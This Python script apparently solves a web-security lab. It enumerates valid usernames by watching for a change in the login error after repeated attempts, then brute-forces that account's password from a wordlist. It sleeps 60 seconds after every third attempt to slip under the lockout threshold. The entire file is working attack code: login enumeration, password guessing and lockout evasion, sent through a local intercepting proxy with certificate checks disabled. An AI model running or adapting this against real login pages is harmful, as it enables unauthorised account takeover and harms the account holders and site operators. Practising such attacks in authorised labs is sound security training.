import requests;import urllib3;import urllib;import sys; import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
cookies = {'session': "50VL5WOG3uhM8C76g7w9NwH3tnx8i4fb"}
proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}

def main():
    url = sys.argv[1]
    usernames_file = open("usernames", 'r')
    usernames = usernames_file.read().split('\n')
    usernames_file.close()
    target_username = ""
    for username in usernames:
        creds = {'username': username, 'password': "sldfkj"}
        for i in range(4):
            res = requests.post(url, cookies=cookies, proxies=proxies, data=creds, verify=False)
            content = res.text
            if "Invalid username or password." not in content:
                target_username = username
                print(username)
        if len(target_username) > 0:
            break

    password_file = open("passwords", 'r')
    passwords = password_file.read().split('\n')
    password_file.close()
    
    i=1
    for password in passwords:
        creds = {'username': target_username, 'password': password}
        res = requests.post(url, cookies=cookies, proxies=proxies, data=creds, verify=False)
        if res.status_code != 200:
            print(password)
        if i%3 == 0:
            time.sleep(60)
        i+=1

if __name__ == "__main__":
    main()
